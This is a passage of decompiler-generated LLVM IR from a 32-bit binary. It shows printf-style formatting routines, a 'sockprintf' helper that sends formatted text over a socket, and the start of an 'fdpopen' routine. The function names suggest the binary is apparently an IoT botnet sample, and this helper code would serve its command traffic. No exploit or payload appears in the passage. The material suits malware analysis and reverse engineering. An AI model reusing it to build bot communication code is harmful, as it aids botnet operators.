  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ 0, %dec_label_pc_10000b0c.preheader ]
  %v2_10000b24 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10000b24, 58
  br i1 %tmp64, label %dec_label_pc_10000ad8, label %dec_label_pc_10000b34

dec_label_pc_10000b34:                            ; preds = %dec_label_pc_10000ad8, %dec_label_pc_10000b20, %dec_label_pc_10000b0c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10000b0c.preheader ], [ %v1_10000af8, %dec_label_pc_10000ad8 ], [ %stack_var_-48.018, %dec_label_pc_10000b20 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10000b0c.preheader ], [ %v5_10000b08, %dec_label_pc_10000ad8 ], [ %stack_var_-68.119, %dec_label_pc_10000b20 ]
  %v2_10000b38 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000b40 = icmp eq i8 %v2_10000b38, 115
  br i1 %v3_10000b40, label %dec_label_pc_10000b48, label %dec_label_pc_10000c08

dec_label_pc_10000b48:                            ; preds = %dec_label_pc_10000b34
  %v2_10000b4c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10000b4c, 7
  br i1 %tmp65, label %dec_label_pc_10000b94, label %dec_label_pc_10000b5c

dec_label_pc_10000b5c:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b60 = load i32, i32* %v2_10000b60, align 4
  %v2_10000b68 = load i8, i8* %tmp, align 1
  %v3_10000b68 = zext i8 %v2_10000b68 to i32
  %v1_10000b74 = mul nuw nsw i32 %v3_10000b68, 4
  %v2_10000b78 = add i32 %v1_10000b74, %v3_10000b60
  %v1_10000b80 = add i8 %v2_10000b68, 1
  store i8 %v1_10000b80, i8* %tmp, align 1
  br label %dec_label_pc_10000bac

dec_label_pc_10000b94:                            ; preds = %dec_label_pc_10000b48
  %v3_10000b98 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ba0 = add i32 %v3_10000b98, 4
  store i32 %v1_10000ba0, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000bac

dec_label_pc_10000bac:                            ; preds = %dec_label_pc_10000b5c, %dec_label_pc_10000b94
  %stack_var_-20.0 = phi i32 [ %v3_10000b98, %dec_label_pc_10000b94 ], [ %v2_10000b78, %dec_label_pc_10000b5c ]
  %v1_10000bb0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10000bb0 = load i32, i32* %v1_10000bb0, align 4
  %v3_10000bbc = icmp eq i32 %v2_10000bb0, 0
  br i1 %v3_10000bbc, label %dec_label_pc_10000bd0, label %dec_label_pc_10000bc4

dec_label_pc_10000bc4:                            ; preds = %dec_label_pc_10000bac
  %v5_10000bc8 = inttoptr i32 %v2_10000bb0 to i8*
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bd0:                            ; preds = %dec_label_pc_10000bac
  br label %dec_label_pc_10000bdc

dec_label_pc_10000bdc:                            ; preds = %dec_label_pc_10000bc4, %dec_label_pc_10000bd0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10014ca4.13, i32 0, i32 0), %dec_label_pc_10000bd0 ], [ %v5_10000bc8, %dec_label_pc_10000bc4 ]
  %v6_10000bf0 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000bfc = add i32 %v6_10000bf0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000c08:                            ; preds = %dec_label_pc_10000b34
  %v2_10000c0c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000c14 = icmp eq i8 %v2_10000c0c, 100
  br i1 %v3_10000c14, label %dec_label_pc_10000c1c, label %dec_label_pc_10000cbc

dec_label_pc_10000c1c:                            ; preds = %dec_label_pc_10000c08
  %v2_10000c20 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_10000c20, 7
  br i1 %tmp66, label %dec_label_pc_10000c68, label %dec_label_pc_10000c30

dec_label_pc_10000c30:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c34 = load i32, i32* %v2_10000b60, align 4
  %v2_10000c3c = load i8, i8* %tmp, align 1
  %v3_10000c3c = zext i8 %v2_10000c3c to i32
  %v1_10000c48 = mul nuw nsw i32 %v3_10000c3c, 4
  %v2_10000c4c = add i32 %v1_10000c48, %v3_10000c34
  %v1_10000c54 = add i8 %v2_10000c3c, 1
  store i8 %v1_10000c54, i8* %tmp, align 1
  br label %dec_label_pc_10000c80

dec_label_pc_10000c68:                            ; preds = %dec_label_pc_10000c1c
  %v3_10000c6c = load i32, i32* %v2_10000b98, align 4
  %v1_10000c74 = add i32 %v3_10000c6c, 4
  store i32 %v1_10000c74, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000c80

dec_label_pc_10000c80:                            ; preds = %dec_label_pc_10000c30, %dec_label_pc_10000c68
  %stack_var_-28.0 = phi i32 [ %v3_10000c6c, %dec_label_pc_10000c68 ], [ %v2_10000c4c, %dec_label_pc_10000c30 ]
  %v1_10000c84 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_10000c84 = load i32, i32* %v1_10000c84, align 4
  %v7_10000ca4 = call i32 @printi(i32 %tmp41, i32 %v2_10000c84, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000cb0 = add i32 %v7_10000ca4, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000cbc:                            ; preds = %dec_label_pc_10000c08
  %v2_10000cc0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000cc8 = icmp eq i8 %v2_10000cc0, 120
  br i1 %v3_10000cc8, label %dec_label_pc_10000cd0, label %dec_label_pc_10000d70

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000cd4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_10000cd4, 7
  br i1 %tmp67, label %dec_label_pc_10000d1c, label %dec_label_pc_10000ce4

dec_label_pc_10000ce4:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000ce8 = load i32, i32* %v2_10000b60, align 4
  %v2_10000cf0 = load i8, i8* %tmp, align 1
  %v3_10000cf0 = zext i8 %v2_10000cf0 to i32
  %v1_10000cfc = mul nuw nsw i32 %v3_10000cf0, 4
  %v2_10000d00 = add i32 %v1_10000cfc, %v3_10000ce8
  %v1_10000d08 = add i8 %v2_10000cf0, 1
  store i8 %v1_10000d08, i8* %tmp, align 1
  br label %dec_label_pc_10000d34

dec_label_pc_10000d1c:                            ; preds = %dec_label_pc_10000cd0
  %v3_10000d20 = load i32, i32* %v2_10000b98, align 4
  %v1_10000d28 = add i32 %v3_10000d20, 4
  store i32 %v1_10000d28, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000d34

dec_label_pc_10000d34:                            ; preds = %dec_label_pc_10000ce4, %dec_label_pc_10000d1c
  %stack_var_-32.0 = phi i32 [ %v3_10000d20, %dec_label_pc_10000d1c ], [ %v2_10000d00, %dec_label_pc_10000ce4 ]
  %v1_10000d38 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_10000d38 = load i32, i32* %v1_10000d38, align 4
  %v7_10000d58 = call i32 @printi(i32 %tmp41, i32 %v2_10000d38, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000d64 = add i32 %v7_10000d58, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000d70:                            ; preds = %dec_label_pc_10000cbc
  %v2_10000d74 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000d7c = icmp eq i8 %v2_10000d74, 88
  br i1 %v3_10000d7c, label %dec_label_pc_10000d84, label %dec_label_pc_10000e24

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d70
  %v2_10000d88 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_10000d88, 7
  br i1 %tmp68, label %dec_label_pc_10000dd0, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d84
  %v3_10000d9c = load i32, i32* %v2_10000b60, align 4
  %v2_10000da4 = load i8, i8* %tmp, align 1
  %v3_10000da4 = zext i8 %v2_10000da4 to i32
  %v1_10000db0 = mul nuw nsw i32 %v3_10000da4, 4
  %v2_10000db4 = add i32 %v1_10000db0, %v3_10000d9c
  %v1_10000dbc = add i8 %v2_10000da4, 1
  store i8 %v1_10000dbc, i8* %tmp, align 1
  br label %dec_label_pc_10000de8

dec_label_pc_10000dd0:                            ; preds = %dec_label_pc_10000d84
  %v3_10000dd4 = load i32, i32* %v2_10000b98, align 4
  %v1_10000ddc = add i32 %v3_10000dd4, 4
  store i32 %v1_10000ddc, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000de8

dec_label_pc_10000de8:                            ; preds = %dec_label_pc_10000d98, %dec_label_pc_10000dd0
  %stack_var_-36.0 = phi i32 [ %v3_10000dd4, %dec_label_pc_10000dd0 ], [ %v2_10000db4, %dec_label_pc_10000d98 ]
  %v1_10000dec = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_10000dec = load i32, i32* %v1_10000dec, align 4
  %v7_10000e0c = call i32 @printi(i32 %tmp41, i32 %v2_10000dec, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_10000e18 = add i32 %v7_10000e0c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000e24:                            ; preds = %dec_label_pc_10000d70
  %v2_10000e28 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000e30 = icmp eq i8 %v2_10000e28, 117
  br i1 %v3_10000e30, label %dec_label_pc_10000e38, label %dec_label_pc_10000ed8

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000e24
  %v2_10000e3c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_10000e3c, 7
  br i1 %tmp69, label %dec_label_pc_10000e84, label %dec_label_pc_10000e4c

dec_label_pc_10000e4c:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e50 = load i32, i32* %v2_10000b60, align 4
  %v2_10000e58 = load i8, i8* %tmp, align 1
  %v3_10000e58 = zext i8 %v2_10000e58 to i32
  %v1_10000e64 = mul nuw nsw i32 %v3_10000e58, 4
  %v2_10000e68 = add i32 %v1_10000e64, %v3_10000e50
  %v1_10000e70 = add i8 %v2_10000e58, 1
  store i8 %v1_10000e70, i8* %tmp, align 1
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e84:                            ; preds = %dec_label_pc_10000e38
  %v3_10000e88 = load i32, i32* %v2_10000b98, align 4
  %v1_10000e90 = add i32 %v3_10000e88, 4
  store i32 %v1_10000e90, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %dec_label_pc_10000e4c, %dec_label_pc_10000e84
  %stack_var_-40.0 = phi i32 [ %v3_10000e88, %dec_label_pc_10000e84 ], [ %v2_10000e68, %dec_label_pc_10000e4c ]
  %v1_10000ea0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_10000ea0 = load i32, i32* %v1_10000ea0, align 4
  %v7_10000ec0 = call i32 @printi(i32 %tmp41, i32 %v2_10000ea0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_10000ecc = add i32 %v7_10000ec0, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000ed8:                            ; preds = %dec_label_pc_10000e24
  %v2_10000edc = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10000ee4 = icmp eq i8 %v2_10000edc, 99
  br i1 %v3_10000ee4, label %dec_label_pc_10000eec, label %dec_label_pc_10000fb8

dec_label_pc_10000eec:                            ; preds = %dec_label_pc_10000ed8
  %v2_10000ef0 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_10000ef0, 7
  br i1 %tmp70, label %dec_label_pc_10000f38, label %dec_label_pc_10000f00

dec_label_pc_10000f00:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f04 = load i32, i32* %v2_10000b60, align 4
  %v2_10000f0c = load i8, i8* %tmp, align 1
  %v3_10000f0c = zext i8 %v2_10000f0c to i32
  %v1_10000f18 = mul nuw nsw i32 %v3_10000f0c, 4
  %v2_10000f1c = add i32 %v1_10000f18, %v3_10000f04
  %v1_10000f24 = add i8 %v2_10000f0c, 1
  store i8 %v1_10000f24, i8* %tmp, align 1
  br label %dec_label_pc_10000f50

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000eec
  %v3_10000f3c = load i32, i32* %v2_10000b98, align 4
  %v1_10000f44 = add i32 %v3_10000f3c, 4
  store i32 %v1_10000f44, i32* %v2_10000b98, align 4
  br label %dec_label_pc_10000f50

dec_label_pc_10000f50:                            ; preds = %dec_label_pc_10000f00, %dec_label_pc_10000f38
  %stack_var_-44.0 = phi i32 [ %v3_10000f3c, %dec_label_pc_10000f38 ], [ %v2_10000f1c, %dec_label_pc_10000f00 ]
  %v1_10000f54 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_10000f54 = load i32, i32* %v1_10000f54, align 4
  %v1_10000f58 = urem i32 %v2_10000f54, 256
  store i32 %v1_10000f58, i32* %stack_var_-88, align 4
  %v5_10000f7c = call i32 @prints(i32 %tmp41, i8* %v4_10000f7c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_10000f88 = add i32 %v5_10000f7c, %stack_var_-56.132
  br label %dec_label_pc_10000fb8

dec_label_pc_10000f94:                            ; preds = %dec_label_pc_10000a24, %dec_label_pc_10000a68
  %stack_var_-68.2 = phi i8* [ %v5_10000a40, %dec_label_pc_10000a68 ], [ %stack_var_-68.434, %dec_label_pc_10000a24 ]
  %v2_10000f98 = load i8, i8* %stack_var_-68.2, align 1
  %v3_10000f98 = zext i8 %v2_10000f98 to i32
  %v3_10000fa8 = call i32 @printchar(i32* %arg1, i32 %v3_10000f98)
  %v1_10000fb0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_10000fb8

dec_label_pc_10000fb8:                            ; preds = %dec_label_pc_10000ed8, %dec_label_pc_10000f50, %dec_label_pc_10000e9c, %dec_label_pc_10000de8, %dec_label_pc_10000d34, %dec_label_pc_10000c80, %dec_label_pc_10000bdc, %dec_label_pc_10000f94
  %stack_var_-56.0 = phi i32 [ %v1_10000fb0, %dec_label_pc_10000f94 ], [ %v2_10000bfc, %dec_label_pc_10000bdc ], [ %v2_10000cb0, %dec_label_pc_10000c80 ], [ %v2_10000d64, %dec_label_pc_10000d34 ], [ %v2_10000e18, %dec_label_pc_10000de8 ], [ %v2_10000ecc, %dec_label_pc_10000e9c ], [ %v2_10000f88, %dec_label_pc_10000f50 ], [ %stack_var_-56.132, %dec_label_pc_10000ed8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_10000f94 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000bdc ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000c80 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000d34 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000de8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000e9c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000f50 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10000ed8 ]
  %v4_10000fb8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_10000fbc = add i32 %v4_10000fb8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_10000fbc to i8*
  %v2_10000fc8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_10000fd0 = icmp eq i8 %v2_10000fc8, 0
  br i1 %v3_10000fd0, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24

dec_label_pc_10000fd8:                            ; preds = %dec_label_pc_10000a38, %dec_label_pc_10000fb8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10000a38 ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v3_10000fdc = icmp eq i32* %arg1, null
  br i1 %v3_10000fdc, label %dec_label_pc_10000ff4, label %dec_label_pc_10000fe4

dec_label_pc_10000fe4:                            ; preds = %dec_label_pc_10000fd8
  %v2_10000fe8 = load i32, i32* %arg1, align 4
  %v3_10000ff0 = inttoptr i32 %v2_10000fe8 to i8*
  store i8 0, i8* %v3_10000ff0, align 1
  br label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fd8, %dec_label_pc_10000fe4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10000aac, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10000a40, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10000b98, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10000ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10000fd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000fb8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_10000f94, { 1, 0 }
  uselistorder label %dec_label_pc_10000f50, { 1, 0 }
  uselistorder label %dec_label_pc_10000e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000de8, { 1, 0 }
  uselistorder label %dec_label_pc_10000d34, { 1, 0 }
  uselistorder label %dec_label_pc_10000c80, { 1, 0 }
  uselistorder label %dec_label_pc_10000bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10000bac, { 1, 0 }
  uselistorder label %dec_label_pc_10000b34, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000b20, { 1, 0 }
  uselistorder label %dec_label_pc_10000aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10000a24, { 1, 0 }
}

define i32 @zprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  store i32 1, i32* %stack_var_-136, align 4
  %v2_10001094 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439712, i32* @lr, align 4
  %v4_1000109c = call i32 @print(i32* null, i32 %arg1, i32 %v2_10001094)
  ret i32 %v4_1000109c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_10001144 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268439888, i32* @lr, align 4
  %v4_1000114c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_10001144)
  ret i32 %v4_1000114c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 2048, i32* @r3, align 4
  store i32 268440016, i32* @lr, align 4
  %v0_100011cc = call i32 @malloc()
  store i32 %v0_100011cc, i32* %stack_var_-144, align 4
  store i32 268440048, i32* @lr, align 4
  %v3_100011ec = call i32 @__GI_memset(i32 %v0_100011cc, i32 0, i32 2048)
  store i32 2, i32* %stack_var_-140, align 4
  %v2_10001220 = ptrtoint i32* %stack_var_-140 to i32
  store i32 268440116, i32* @lr, align 4
  %v4_10001230 = call i32 @print(i32* nonnull %stack_var_-144, i32 %arg2, i32 %v2_10001220)
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001238 = call i32 @__GI_strlen()
  %v2_10001248 = add i32 %v0_10001238, %v0_100011cc
  %v3_10001250 = inttoptr i32 %v2_10001248 to i8*
  store i8 10, i8* %v3_10001250, align 1
  store i32 %v0_100011cc, i32* @r3, align 4
  %v0_10001258 = call i32 @__GI_strlen()
  store i32 268440180, i32* @lr, align 4
  %v4_10001270 = call i32 @__libc_send(i32 %arg1, i32 %v0_100011cc, i32 %v0_10001258, i32 16384)
  store i32 %v0_100011cc, i32* @r3, align 4
  store i32 268440196, i32* @lr, align 4
  %v0_10001280 = call i32 @free()
  ret i32 %v4_10001270

; uselistorder directives
  uselistorder i32 %v0_100011cc, { 1, 4, 2, 0, 3, 5, 6 }
  uselistorder i32* %stack_var_-140, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %v2_100012c4 = load i8, i8* %arg2, align 1
  %v3_100012cc = icmp eq i8 %v2_100012c4, 114
  br i1 %v3_100012cc, label %dec_label_pc_100012e8, label %dec_label_pc_100012d4

dec_label_pc_100012d4:                            ; preds = %entry
  %v2_100012d8 = load i8, i8* %arg2, align 1
  %v3_100012e0 = icmp eq i8 %v2_100012d8, 119
  br i1 %v3_100012e0, label %dec_label_pc_100012e8, label %dec_label_pc_10001300

